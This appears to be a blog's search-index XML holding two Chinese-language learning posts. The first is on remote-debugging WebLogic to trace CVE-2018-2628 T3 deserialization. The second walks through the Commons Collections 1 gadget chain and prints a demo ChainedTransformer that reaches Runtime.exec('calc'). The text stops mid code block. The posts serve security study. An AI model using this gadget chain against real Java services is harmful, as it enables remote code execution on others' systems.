<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>weblogic远程调试和T3反序列化简单分析</title>
    <link href="/2024/04/14/weblogic%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%92%8CT3%E6%95%B0%E6%8D%AE%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/14/weblogic%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%92%8CT3%E6%95%B0%E6%8D%AE%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>最近一直在学习cc链，总感觉学了但是又好像没学，于是想着复现cve来了解一下这些链子的实际使用。在复现的过程中，突然想仔细分析一下它exp的攻击流量，后面发现这个流量似乎使用反序列化去触发rmi连接恶意服务器，但是这里rmi的了解也不是很深，遂简单记一下idea远程调试的配置和t3中一些数据的分析。</p><h2 id="自行搭建"><a href="#自行搭建" class="headerlink" title="自行搭建"></a>自行搭建</h2><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">GitHub - QAX-A-Team&#x2F;WeblogicEnvironment: Weblogic环境搭建工具</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">构建镜像<br>docker build <span class="hljs-attr">--build-arg</span> JDK_PKG=jdk-<span class="hljs-number">7</span>u21-linux-x64<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> <span class="hljs-attr">--build-arg</span> WEBLOGIC_JAR=fmw_12.<span class="hljs-number">1.3</span>.<span class="hljs-number">0.0</span>_wls<span class="hljs-selector-class">.jar</span>  -t weblogic:v1 .<br><br><br>运行<br>docker run -d -<span class="hljs-selector-tag">p</span> <span class="hljs-number">7001</span>:<span class="hljs-number">7001</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8453</span>:<span class="hljs-number">8453</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">5556</span>:<span class="hljs-number">5556</span> <span class="hljs-attr">--name</span> weblogic we<br><br></code></pre></td></tr></table></figure><p>然后需要使用docker命令将需要调试的目录从虚拟机复制出来，然后作为依赖引入，就可以调试了。</p><h2 id="vulhub-weblogic的idea调试"><a href="#vulhub-weblogic的idea调试" class="headerlink" title="vulhub_weblogic的idea调试"></a>vulhub_weblogic的idea调试</h2><p>首先在docker-compose.yml添加一个端口映射，这个端口映射是用来debug连接的。<br>然后启动容器，进入容器；<br>进入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/</span>Oracle<span class="hljs-regexp">/Middleware/u</span>ser_projects<span class="hljs-regexp">/domains/</span>base_domain/bin<br><br></code></pre></td></tr></table></figure><p>然后在setDomainEnv.sh中添加</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">debugFlag</span>=<span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attribute">DEBUG_PORT</span>=44444<br><span class="hljs-built_in">export</span> debugFlag<br></code></pre></td></tr></table></figure><p>然后回到宿主机重启docker</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo service docker restart</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>然后进入docker将需要的文件复制出来。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker cp 镜像名<span class="hljs-symbol">:/root/Oracle</span> ./<br></code></pre></td></tr></table></figure><p>这里复制整个就可以，然后通过find命令将其中的jar包提取出来即可。但是这一步我不是很理解，按理来说可以直接将想要查看断点的文件add as lib即可查看，这样会比较方便，但是包不完整。获取上面这一步就是为了解决包不完整的问题吧。<br>具体操作流程如图：<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141558512.png" alt="image.png"></p><p>然后从外面就可以看到test中的所有jar包可以直接查看了。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141558120.png" alt="image.png"></p><p>当然也可以图方便直接将需要看的jar包进行下图操作，这样就可以直接在项目文件夹中查看了。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141558473.png" alt="image.png"></p><p>最后只需要配置一下远程调试即可</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141559498.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141559498.png"></p><p>因为我这里在之前docker-compose中设置的是44444端口，所以这里就是虚拟机ip加这个端口即可。<br>然后调试，因为我这里是cve-2018-2628所以我就找了个漏洞的调用栈中的函数断一下。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141600748.png" alt="image.png"></p><p>发送paylaod就会发现被断下来了。<br>这里可以参考我们jrmp服务器上设置的payload然后根据使用的攻击链在对应的函数执行点下断点，然后发送paylaod即可，这里我们使用的是cc1的攻击链，所以直接断在transform相关函数即可看到全部的调用栈了。但是如果想要查看t3的实际连接过程就不能断在这里，因为实在找不到调用栈在哪层调用栈。最好是直接定位到<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141600115.png" alt="image.png"></p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">void <span class="hljs-keyword">init</span>(Chunk var1, MsgAbbrevJVMConnection var2) throws ClassNotFoundException, IOException &#123;  <br>    <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(var1, <span class="hljs-number">4</span>);  <br>    <span class="hljs-keyword">this</span>.connection = var2;  <br>    <span class="hljs-keyword">this</span>.responseId = -<span class="hljs-number">1</span>;  <br>    <span class="hljs-keyword">this</span>.user = <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">this</span>.header.readHeader(<span class="hljs-keyword">this</span>, var2.getRemoteHeaderLength());  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.connectionManager.thisRJVM != <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">this</span>.header.src = <span class="hljs-keyword">this</span>.connectionManager.thisRJVM.getID();  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">this</span>.header.dest = JVMID.localID();  <br>    <span class="hljs-keyword">if</span> (KernelStatus.DEBUG &amp;&amp; debugMessaging.isDebugEnabled()) &#123;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">this</span>.mark(<span class="hljs-keyword">this</span>.header.abbrevOffset);  <br>    <span class="hljs-comment">//这里会跳过很长一段字节，但是原因不是很清楚，但是它刚好跳到了fe01这个位置，这是每个反序列化数据流的前缀，应该算是加了T3特征的反序列化流</span><br>    <span class="hljs-keyword">this</span>.skip((long)(<span class="hljs-keyword">this</span>.header.abbrevOffset - <span class="hljs-keyword">this</span>.pos()));  <br>    var2.readMsgAbbrevs(<span class="hljs-keyword">this</span>);  <br>    <span class="hljs-keyword">this</span>.reset();  <br>    <span class="hljs-keyword">if</span> (JVMID.localID().equals(<span class="hljs-keyword">this</span>.header.dest)) &#123;  <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.header.getFlag(<span class="hljs-number">8</span>)) &#123;  <br>            <span class="hljs-keyword">this</span>.read81Contexts();  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">this</span>.readExtendedContexts();  <br>        &#125;  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>当然喽，虽然我觉得能定位到握手包那里然后一路跟进才是最好的。但是自己实力实在不是很行，看底层通信的实现实在有点费劲，只好定位到网上师傅们说的位置了。这里就是对t3流量进行解析的地方，首先他会初始化一些变量，例如header和pos等参数，这里的pos是用来观测该数据流在代码中解析的重要依据。</p><p>数据解析的第一步：</p><ul><li>初始化变量</li><li>跳过表示长度的四个字节</li></ul><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141600044.png" alt="image.png"><br>然后就是readHeader这个函数，通过读取流来完善连接信息（这些信息并不是反序列化数据，而是在后续代码中还要作为处理依据的标志）<br>具体的含义可以参考：<a href="https://mp.weixin.qq.com/s/Aliyq0aLJEQt5SRqaYbnrQ">这位大佬的文章</a><br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141602307.png" alt="image.png"></p><p>然后这里readByte是读取消耗一个字节，readInt则是四个，readInt中的具体操作是依次从字节流中读取四个字节然后进行左位移操作，不是很懂，但是只知道很牛逼。因为得到的abbrevOffset值，是从连接信息（header）到真正需要反序列化的数据间的距离。</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404141601766.png" alt="image.png"></p><p>然后就是走完上述流程就会进去InboundMsgAbbrev#readMsgAbbrevs，开始真整的反序列化过程。依次进入同一个类中的read和readObject，最后在</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">private</span> <span class="hljs-function">Object <span class="hljs-title">readObject</span><span class="hljs-params">(MsgAbbrevInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;  <br>    <span class="hljs-keyword">int</span> var2 = var1.read();  <br>    <span class="hljs-keyword">switch</span> (var2) &#123;  <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:  <br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> ServerChannelInputStream(var1)).readObject();  <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:  <br>            <span class="hljs-keyword">return</span> var1.readASCII();  <br>        <span class="hljs-keyword">default</span>:  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> StreamCorruptedException(<span class="hljs-string">&quot;Unknown typecode: &#x27;&quot;</span> + var2 + <span class="hljs-string">&quot;&#x27;&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>进入在这里的case0中进入正式反序列化。这里本来是想继续分析的，但是仔细看了一下，发现在没有连接JRMP服务端时，打的就是cc1，使用rmi服务去请求我设置好的JRMP服务端，这就是exp所作的事。因为想做流量分析但是对rmi了解不是很深刻，所以打算后续深入学习一下rmi后再一并进行流量的分析。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化学习_CommonsCollections_1</title>
    <link href="/2024/04/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_CommonsCollections_1/"/>
    <url>/2024/04/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_CommonsCollections_1/</url>
    
    <content type="html"><![CDATA[<h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>这个类在cc1当中主要的作用是获取初始的类，因为放入什么返回什么的特性很方便就可以得到想要的类。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-title class_">Object</span> constantToReturn) &#123;  <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">iConstant</span> = constantToReturn;  <br>&#125;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> input</span>) &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">iConstant</span>;  <br>&#125;  <br></code></pre></td></tr></table></figure><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>在cc1当中主要起作用的就是这个类的如下函数</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">private</span> InvokerTransformer(String methodName) &#123;  <br>    <span class="hljs-keyword">this</span>.iMethodName = methodName;  <br>    <span class="hljs-keyword">this</span>.iParamTypes = <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">this</span>.iArgs = <span class="hljs-literal">null</span>;  <br>&#125;  <br>  <br><span class="hljs-keyword">public</span> InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;  <br>    <span class="hljs-keyword">this</span>.iMethodName = methodName;  <br>    <span class="hljs-keyword">this</span>.iParamTypes = paramTypes;  <br>    <span class="hljs-keyword">this</span>.iArgs = args;  <br>&#125;  <br>  <br><span class="hljs-keyword">public</span> Object transform(Object input) &#123;  <br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Class cls = input.getClass();  <br>            Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs);  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var5) &#123;  <br>            <span class="hljs-keyword">throw</span> new FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);  <br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;  <br>            <span class="hljs-keyword">throw</span> new FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);  <br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var7) &#123;  <br>            <span class="hljs-keyword">throw</span> new FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, var7);  <br>        &#125;  <br>    &#125;  <br>&#125;  <br></code></pre></td></tr></table></figure><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这个类是将我们需要的payload拼接出来的类</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> ChainedTransformer(Transformer[] transformers) &#123;  <br>    <span class="hljs-keyword">this</span>.iTransformers = transformers;  <br>&#125;  <br>  <br><span class="hljs-keyword">public</span> Object transform(Object <span class="hljs-keyword">object</span>) &#123;  <br>    <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.iTransformers.length; ++i) &#123;  <br>        <span class="hljs-keyword">object</span> = <span class="hljs-keyword">this</span>.iTransformers[i].transform(<span class="hljs-keyword">object</span>);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">object</span>;  <br>&#125;  <br></code></pre></td></tr></table></figure><h2 id="关于transformer的拼接过程"><a href="#关于transformer的拼接过程" class="headerlink" title="关于transformer的拼接过程"></a>关于transformer的拼接过程</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        <span class="hljs-comment">//transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</span><br>        ChainedTransformer transformerChain = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(transformers);<br>        transformerChain.transform(<span class="hljs-number">1</span>);<span class="hljs-comment">//完全的cc1需要找到哪里可调用transform方法</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目标：Runtime.getRuntime().exec(command)<br>根据payload和上面chainedTransformer可以看出来首先是通过传入RunTime直接获取到RunClass这个类。然后再将getMethod和参数getRunTime传入，于是就得到了</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RunTime</span>.</span></span>get<span class="hljs-constructor">Method(&#x27;<span class="hljs-params">getRunTime</span>&#x27;)</span><br></code></pre></td></tr></table></figure><p>现在获取到的是getRunTime这个方法，但是并没有执行所以我们需要传入invoke方法并传入空参数，得到</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RunTime</span>.</span></span>get<span class="hljs-constructor">Method(&#x27;<span class="hljs-params">getRunTime</span>&#x27;)</span>.invoke(null)<br>即<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RunTime</span>.</span></span>get<span class="hljs-constructor">RunTime()</span><br></code></pre></td></tr></table></figure><p>最后再传入exec以及提前准备好的cmd即可得到完整的反射命令执行；<br>其实除了这些我比较异或的还有例如Class[0]这样的参数作用是啥</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">在这个代码段中，`new Class[<span class="hljs-number">0</span>]` 表示一个空的 `Class` 数组。在 Java 中，这种方式通常用于表示一个空数组，它可以用作方法调用的参数列表。在这里，`new Class[<span class="hljs-number">0</span>]` 作为 `getMethod` 方法的参数，表示没有额外的参数需要传递给 `getMethod` 方法。<br></code></pre></td></tr></table></figure><h1 id="触发命令执行的链子"><a href="#触发命令执行的链子" class="headerlink" title="触发命令执行的链子"></a>触发命令执行的链子</h1><p>所以要寻找一个参数调用了transformers方法，然后将这个参数赋值位chainTransformer即可。也就是这里出现了cc1的分支，这里有两种路线一种是走transformermap，还有一种则是总lazymap</p><h2 id="transformermap"><a href="#transformermap" class="headerlink" title="transformermap"></a>transformermap</h2><p>走这条链的话主要涉及以下几个类<br>首先是可以触发transform方法的TransformedMap</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span> extends AbstractInputCheckedMapDecorator implements Serializable &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">7023152376788900464L</span>;  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>……<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TransformedMap</span>(map, keyTransformer, valueTransformer);  <br>    &#125;<br>……<br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;  <br>    <span class="hljs-built_in">super</span>(map);  <br>    <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;  <br>    <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;  <br>&#125;<br>……<br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.valueTransformer.<span class="hljs-built_in">transform</span>(value);  <br>&#125;<br>……<br>省略若干方法<br></code></pre></td></tr></table></figure><p>transformmap这个类中的checkSetValue方法中有对transform的调用，因此只需要将valueTransformer赋值为chainTransform这个类即可，但是由于他的构造方法是protect的，无法在不同的包下new这种方法。因此我们需要考虑反射或者其他方法，这里的话比较简单，往上面看就可以发现它的decorate方法中实例化了这个类。于是我们只需要调用即可（这个方法是静态的）</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; decorate = TransformedMap.decorate(hash, <span class="hljs-literal">null</span>, chainedTransformer);<br></code></pre></td></tr></table></figure><p>找到了可以调用transformer的方法就该寻找链子的下一个节点了，接下来的方法需要进入</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapDecorator</span> </span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-type">AbstractInputCheckedMapDecorator</span>() &#123;  <br>&#125;  <br>  <br><span class="hljs-keyword">protected</span> <span class="hljs-type">AbstractInputCheckedMapDecorator</span>(<span class="hljs-type">Map</span> map) &#123;  <br>    <span class="hljs-keyword">super</span>(map);  <br>&#125;<br>……<br>static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapEntryDecorator</span> </span>&#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent;  <br>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">MapEntry</span>(<span class="hljs-type">Map</span>.<span class="hljs-type">Entry</span> entry, <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent) &#123;  <br>        <span class="hljs-keyword">super</span>(entry);  <br>        <span class="hljs-keyword">this</span>.parent = parent;  <br>    &#125;  <br>  <br>    public <span class="hljs-type">Object</span> setValue(<span class="hljs-type">Object</span> value) &#123;  <br>        value = <span class="hljs-keyword">this</span>.parent.checkSetValue(value);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.entry.setValue(value);  <br>    &#125;  <br>&#125;<br>……<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这个类和它的内部类都继承了AbstractMapEntryDecorator然后再跟进可以发现这个类只是简单重写了一些基础方法并继承了Map.Entry</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-symbol">Map</span>&lt;<span class="hljs-symbol">K</span>,<span class="hljs-symbol">V</span>&gt; &#123;<br><span class="hljs-keyword">interface</span> <span class="hljs-symbol">Entry</span>&lt;<span class="hljs-symbol">K</span>,<span class="hljs-symbol">V</span>&gt; &#123;<br>这里定义了<span class="hljs-keyword">set</span>方法。<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我现在已经得到checksetValue，那么我现在需要的是控制setvalue方法的参数，然后寻找带有readObject的方法。<br>目前我不知道这里的setvalue的parent的是如何得到的，所以我想到直接断个点在然后跑payload就可以得到调用栈了。期间我还发现一个功能，只要在想监控的变量上断点，那么在它变化的时候就会断在那里。</p><p>首先看到我们需要关注的地方</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 